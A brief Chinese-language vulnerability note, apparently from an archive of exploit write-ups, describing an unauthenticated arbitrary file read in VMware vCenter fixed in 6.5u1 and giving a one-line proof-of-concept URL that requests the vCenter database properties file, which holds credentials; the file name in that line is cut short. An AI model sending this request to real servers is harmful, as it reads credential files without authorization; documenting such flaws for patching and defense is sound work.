---
source: "历史归档批(无原始出处标注)"
---

# VMware vCenter未授权任意文件读取

### 原文链接

> https://twitter.com/ptswarm/status/1316016337550938122

在VMware vCenter中发现了一个未经身份验证的任意文件读取漏洞。VMware透露此漏洞已在6.5u1中修复，但未分配CVE

![img](./.resource/VMwarevCenter未授权任意文件读取/media/640-20201014105633643.jpeg)



***\*POC\**:**

```
http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properti
```